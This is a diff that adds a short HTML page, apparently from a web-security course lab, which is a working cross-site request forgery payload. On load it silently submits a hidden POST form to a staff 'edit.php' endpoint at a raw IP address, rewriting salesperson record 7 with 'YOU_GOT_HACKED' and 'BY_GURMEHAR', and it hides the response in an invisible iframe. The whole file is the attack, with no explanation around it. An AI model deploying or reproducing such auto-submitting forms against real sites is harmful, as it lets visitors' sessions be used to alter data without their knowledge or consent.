@@ -1,0 +1,18 @@
+<html>
+
+<head>
+  <title>CSRF Form</title>
+</head>
+
+<body onload="document.really_cool_form.submit()">
+  <form action='https://35.194.21.71/red/public/staff/salespeople/edit.php?id=7' method="POST" name="really_cool_form" style="display: none;" target="hidden_results">
+    <input type="text" name="first_name" value="YOU_GOT_HACKED" />
+    <input type="text" name="last_name" value="BY_GURMEHAR" />
+    <input type="text" name="phone" value="555-555-5555" />
+    <input type="text" name="email" value="fake@email.com" />
+
+  </form>
+  <iframe name="hidden_results" style="display: none;"></iframe>
+</body>
+
+</html>
